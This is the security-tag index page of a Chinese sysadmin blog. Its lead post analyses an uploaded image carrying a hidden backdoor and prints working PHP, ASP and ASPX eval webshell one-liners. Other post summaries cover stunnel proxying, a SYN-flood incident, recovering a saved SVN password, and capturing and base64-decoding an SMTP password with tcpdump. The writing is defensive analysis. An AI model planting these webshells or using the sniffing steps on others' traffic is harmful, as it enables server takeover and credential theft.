@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Eleven.I386's Blog</title>
+    <meta name="description" content="">
+    <meta name="author" content="eleven.i386">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+    <!--[if lt IE 9]>
+    <script src="http://eleveni386.7axu.com/theme/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le styles -->
+    <link href="http://eleveni386.7axu.com/feeds/rss.xml" type="application/atom+xml" rel="alternate" title="ElevenI386'blog Atom Feed" />
+    <link href="http://eleveni386.7axu.com/theme/bootstrap.min.css" rel="stylesheet">
+    <link href="http://eleveni386.7axu.com/theme/bootstrap.min.responsive.css" rel="stylesheet">
+    <link href="http://eleveni386.7axu.com/theme/local.css" rel="stylesheet">
+    <link href="http://eleveni386.7axu.com/theme/pygments.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+<div class="navbar">
+    <div class="navbar-inner">
+    <div class="container">
+
+         <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+             <span class="icon-bar"></span>
+             <span class="icon-bar"></span>
+             <span class="icon-bar"></span>
+         </a>
+
+        <a class="brand" href="http://eleveni386.7axu.com">Eleven.I386's Blog</a>
+
+        <div class="nav-collapse">
+        <ul class="nav">
+                    
+                            <li><a href="http://eleveni386.7axu.com/pages/guan-yu-bo-zhu.html">关于博主</a></li>
+                        </ul>
+        </div>
+        
+    </div>
+    </div>
+</div>
+
+<div class="container">
+    <div class="content">
+    <div class="row">
+
+        <div class="span9">
+                
+
+        
+
+
+    <div class='article'>
+        <div class="content-title">
+            <a href="http://eleveni386.7axu.com/posts/2013/08/11/tu-pian-hou-men-fen-xi/"><h1>图片后门分析</h1></a>
+            日 11 八月 2013
+
+by <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
+ 
+
+
+ 
+        </div>
+        
+        <div><p>就在刚才, 我们服务器拦截一个用户上传的图片, 有php.hide类型的木马问题, 
+我将图片抓到本地pc上改名为xx, 然后上传到http://www.virscan.org/ 进行多病毒库扫描, 
+发现只有clamav报毒, (我本地pc用的也是它) 我先确定这家伙都是不是图片.</p>
+<div class="highlight"><pre>    <span class="n">file</span> <span class="n">xx</span><span class="p">.</span><span class="n">png</span>
+    <span class="n">xx</span><span class="p">.</span><span class="n">jpg</span><span class="p">:</span> <span class="n">JPEG</span> <span class="o">/</span><span class="n">image</span> <span class="n">data</span><span class="p">,</span> <span class="n">JFIF</span> <span class="n">standard</span> 1<span class="p">.</span>01
+</pre></div>
+
+
+<p>很好,这货还是一张图片, 再看看这个图片隐藏了啥木马,一般人都喜欢往图片的尾巴上插入内容,</p>
+<p><code>tail -n 10 xx.png</code></p>
+<p><img alt="" src="/image/DeepinScrot-2016-300x70.png" /></p>
+<p>好吧,这货看上去很无辜的样子, 但是咱很相信<strong>clamav</strong>的说 :-),  <strong>clamv</strong>既然说
+这货不干净,那么就肯定有什么奇怪的东西混进去了, 那就看看图片头部上有啥东西</p>
+<p><code>head -n 1 xx.png</code></p>
+<p><img alt="" src="/image/DeepinScrot-2239-300x19.png" /></p>
+<p>嘿嘿,看见了么, 我们发现了一只奇怪的字符串呢, 在这里 就在这里</p>
+<div class="highlight"><pre><span class="x">&lt;?fputs(fopen(&quot;TNT.PHP&quot;,&quot;w&quot;),&quot;&lt;?eval(\$_POST[TNT]);?&gt;&quot;)?&gt;&quot;</span>
+<span class="cp">&lt;%</span><span class="n">execute</span><span class="p">(</span><span class="n">request</span><span class="p">(</span><span class="s2">&quot;TNT&quot;</span><span class="p">))</span><span class="cp">%&gt;</span><span class="x">&lt;?php eval($_POST[TNT]);?&gt; </span>
+<span class="cp">&lt;%</span> <span class="vi">@Page</span> <span class="no">Language</span><span class="o">=</span><span class="s2">&quot;Jscript&quot;</span><span class="cp">%&gt;&lt;%</span><span class="nb">eval</span><span class="p">(</span><span class="no">Request</span><span class="o">.</span><span class="n">Item</span><span class="o">[</span><span class="s2">&quot;TNT&quot;</span><span class="o">]</span><span class="p">,</span><span class="s2">&quot;unsafe&quot;</span><span class="p">);</span><span class="cp">%&gt;</span><span class="x">�</span>
+</pre></div>
+
+
+<p>到此分析就结束了, 没啥技术含量,但是做这个木马的人 更没有技术含量… </p></div>
+        <hr />
+    </div>
+		
+    
+ 
+        
+
+ 
+
+    <div class='article'>
+        <a href="http://eleveni386.7axu.com/posts/2013/05/17/jia-mi-ni-de-httpqing-qiu-chuan-qiang/"><h2>加密你的HTTP请求(穿墙)</h2></a>
+        <div class= "well small"> 五 17 五月 2013
+
+by <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
+ 
+
+
+ </div>
+        <div class="summary"><p>之前用<strong>kangle</strong>在香港的vps上做了一个http代理
+  但是在使用的时候发现,访问国外的一些站点 还是无法正常访问,但是在vps上面访问正常,
+而且kangle日志里面看见国外那些站点返回的状态码也是200,说明vps请求那些站点是没问题的
+那么问题就是发生在客户端跟vps之间了,因为这一段的数据是明文的HTTP请求, 很容易被上层运营商过滤掉
+那么我们就将客户端跟vps之间这段http过程加密就好了,</p>
+<h2>Stunnel</h2>
+<blockquote>
+<p>Stunnel 是一种程序，使程序员和系统管理员可以很轻松地对任意 TCP 会话加密。
+您可以很轻松地在客户机和服务器上启用 SSL ― 而且这样做不会影响程序源代码。
+Stunnel 服务器主要执行两个功能：
+一，首先，接收未加密的数据流，进行 SSL 加密，然后将其通过网络发送；
+二，对已进行 SSL 加密的数据流进行解密，并将其通过网络发送给另一个程序
+（该程序通常驻留在同一机器上，以避免本地网络上的窥探攻击）。</p>
+</blockquote>
+<p><a href="https://www.stunnel.org/downloads.html">下载地址</a></p>
+<h2>安装注意</h2>
+<p>在make install 的时候会要求你输入一些信息,用来生成证书, 按照提示输入即可</p>
+<h2>配置</h2>
+<h3>这里仅作为proxy</h3>
+<div class="highlight"><pre><span class="n">syslog</span> <span class="p">=</span> <span class="n">yes</span>  #使用 ...</pre></div> <a class="btn btn-info xsmall" href="http://eleveni386.7axu.com/posts/2013/05/17/jia-mi-ni-de-httpqing-qiu-chuan-qiang/">read more</a></div>
+    </div>	
+				
+    
+ 
+        
+
+ 
+
+    <div class='article'>
+        <a href="http://eleveni386.7axu.com/posts/2013/03/29/ji-ci-ddosgong-ji-dao-zhi-fu-wu-qi-si-ji/"><h2>记. 一次ddos攻击,导致服务器死机</h2></a>
+        <div class= "well small"> 五 29 三月 2013
+
+by <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
+ 
+
+
+ </div>
+        <div class="summary"><h2>背景</h2>
+<p>某年某月某天,eleven所属单位 被未知生物ddos攻击, 攻击时间 凌晨00:15 左右, 
+eleven不在现场.其他同事处理的, 第二天eleven来到公司, 接到上面命令找出服务器弱点.
+同时还原攻击现场,</p>
+<h2>检查</h2>
+<p>通过<strong>Zenoss</strong>监控图, 看见在00:15左右, 突然进来了大量的数据包, 大概40w左右, 
+但是流量没有明显异常(即没有瞬间增高), 好吧, 看见这个现象就猜到了.. 小包<strong>DDos</strong>攻击.
+通过服务器的message日志里面看见了<em>syn flood on 80</em> 记录,结合监控图上的大量数据包,
+断定服务器被人采用<strong>syn半开攻击</strong>手法给攻击</p>
+<h2>服务器配置</h2>
+<p>观察了服务器的内核参数配置,因为我记得我们所有服务器都有对于<strong>syn flood</strong>的防御策略,
+在sysctl.conf里面<strong>syn_cookies</strong>已经开启, 而且也看见syn队列增加到了1w6, 
+按理来说单纯的半开攻击应该对于我们机器是无压力的说 ...</p> <a class="btn btn-info xsmall" href="http://eleveni386.7axu.com/posts/2013/03/29/ji-ci-ddosgong-ji-dao-zhi-fu-wu-qi-si-ji/">read more</a></div>
+    </div>	
+				
+    
+ 
+        
+
+ 
+
+    <div class='article'>
+        <a href="http://eleveni386.7axu.com/posts/2012/11/28/wang-ji-mi-ma-zhi-svn/"><h2>忘记密码之 Svn</h2></a>
+        <div class= "well small"> 三 28 十一月 2012
+
+by <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
+ 
+
+
+ </div>
+        <div class="summary"><p>今天,突发奇想在虚拟机中装一个<em>svn客户端</em>,这样就省的每次更改或者提交日志文档的时候,
+需要将文件从虚拟机中拖到本地,然后输入<code>svn ci</code> 命令了, 于是,遂安装之.. 在<code>checkout</code>的时候,
+突然想到自己不记得密码了,(一直以来所有密码都是直接保存的,自己记不住)</p>
+<p>于是找管理员要, 一看, .. 咱们svn管理员没在线, 看来还是要自己动手,</p>
+<p>工具准备: <strong>file</strong>一枚, <strong>cat</strong>一把</p>
+<p>由于我之前一直都是在linux下用命令提交更新, 在linux下已经<code>checkout</code>过一次了,
+同时我也选择了保存密码到本地, 因此 在我本地的某一个地方肯定会有svn的相关记录,
+于是google之.. 找到了 svn的密码文件是保存在<strong>$HOME/.subversion/auth/svn.simple</strong> 下,
+由于我在code.google.com上也有一个svn帐号,因此我这里有两个文件,</p>
+<p><img alt="" src="/image/2012-11-28-104153-300x31.png" /></p>
+<p>由于不清楚这两个文件是啥, 于是<code>file</code>之 ...</p> <a class="btn btn-info xsmall" href="http://eleveni386.7axu.com/posts/2012/11/28/wang-ji-mi-ma-zhi-svn/">read more</a></div>
+    </div>	
+				
+    
+ 
+        
+
+ 
+
+    <div class='article'>
+        <a href="http://eleveni386.7axu.com/posts/2012/09/17/ji-ci-you-xiang-mi-ma-diu-shi/"><h2>记. 一次邮箱密码丢失</h2></a>
+        <div class= "well small"> 一 17 九月 2012
+
+by <a class="url fn" href="http://eleveni386.7axu.com/author/eleveni386.html">eleven.i386</a>
+ 
+
+
+ </div>
+        <div class="summary"><p>话说某年某月某天, 某人丢失公司分配的邮箱密码,</p>
+<p>在虚拟机中的windows,用foxmail客户端, 因为某些原因密码丢失,而公司邮件又需要用
+该客户端发送,于是就有了下面的过程,</p>
+<p>在物理机中的雷鸟客户端保存了密码, 首先需要客户端上的密码加密,主要是smtp密码传输加密</p>
+<p>好了,然后就用<strong>tcpdump</strong> 就可以了,</p>
+<p><code>tcpdump -X -i eth0 port 587 -vv</code></p>
+<p>TLS/STARTTLS 端口是587 ,雷鸟和foxmail都自动认出来端口是587,所以我也捕抓发往587端口的数据</p>
+<p>从结果中分析,下图是客户端跟服务端验证过程</p>
+<p><img alt="" src="/image/2012-09-17-163233_1365x306_scrot1.png" /></p>
+<p>得到一个base64的密码,</p>
+<p><code>echo -n "password" | base64 -d</code></p>
+<p>解开就是明文密码</p> <a class="btn btn-info xsmall" href="http://eleveni386.7axu.com/posts/2012/09/17/ji-ci-you-xiang-mi-ma-diu-shi/">read more</a></div>
+    </div>	
+				
+            <div class="pagination">
+<ul>
+    <li class="prev disabled"><a href="#">&larr; Previous</a></li>
+
+    <li class="active"><a href="http://eleveni386.7axu.com/tag/an-quan.html">1</a></li>
+
+    <li class="next disabled"><a href="#">&rarr; Next</a></li>
+
+</ul>
+</div>    
+ 
+  
+        </div>
+        
+        <div class="span3">
+
+            <div class="well" style="padding: 8px 0; background-color: #FBFBFB;">
+            <ul class="nav nav-list">
+                <li class="nav-header"> 
+                Site
+                </li>
+            
+                <li><a href="http://eleveni386.7axu.com/">Archives</a>
+                <li><a href="http://eleveni386.7axu.com/tags.html">Tags</a>
+                <li><a href="http://eleveni386.7axu.com/feeds/rss.xml" rel="alternate">Atom feed</a></li>
+                            </ul>
+            </div>
+
+
+                        <div class="well" style="padding: 8px 0; background-color: #FBFBFB;">
+            <ul class="nav nav-list">
+                <li class="nav-header"> 
+                Categories
+                </li>
+                
+                                <li><a href="http://eleveni386.7axu.com/category/linuxzhuo-mian.html">Linux桌面</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/linuxyun-wei.html">Linux运维</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/python.html">python</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/vim.html">vim</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/mu-ma-bing-du.html">木马病毒</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/jian-kong-xi-tong.html">监控系统</a></li>
+                                <li><a href="http://eleveni386.7axu.com/category/ruan-jian-tui-jian.html">软件推荐</a></li>
+                                   
+            </ul>
+            </div>
+            
+
+                        <div class="well" style="padding: 8px 0; background-color: #FBFBFB;">
+            <ul class="nav nav-list">
+                <li class="nav-header"> 
+                Links
+                </li>
+            
+                            <li><a href="http://www.linuxzen.com/">cold</a></li>
+                            <li><a href="http://lilydjwg.is-programmer.com/">依云</a></li>
+                            <li><a href="https://www.7axu.com/">小柒'网络志</a></li>
+                            <li><a href="http://neteue.com/">小邪兽</a></li>
+                        </ul>
+            </div>
+            
+
+                        <div class="social">
+            <div class="well" style="padding: 8px 0; background-color: #FBFBFB;">
+            <ul class="nav nav-list">
+                <li class="nav-header"> 
+                Social
+                </li>
+           
+                                <li><a href="https://github.com/eleveni386">github</a></li>
+                                <li><a href="https://plus.google.com/102949387282276761880/posts/p/pub">G+</a></li>
+                            </ul>
+            </div>
+            </div>
+            
+        </div>  
+    </div>     </div> 
+<footer>
+<br />
+<p><a href="http://eleveni386.7axu.com">Eleven.I386's Blog</a> &copy; eleven.i386 2012</p>
+<script src="http://v1.cnzz.com/stat.php?id=4484286&web_id=4484286" language="JavaScript"></script>
+</footer>
+
+</div> <!-- /container -->
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+<script src="http://twitter.github.com/bootstrap/assets/js/bootstrap-collapse.js"></script>
+<a href="https://github.com/eleveni386"><img style="position: absolute; top: 40px; right: 0; border: 0;" src="http://s3.amazonaws.com/github/ribbons/forkme_right_white_ffffff.png" alt="Fork me on GitHub" /></a>
+ 
+</body>
+</html>
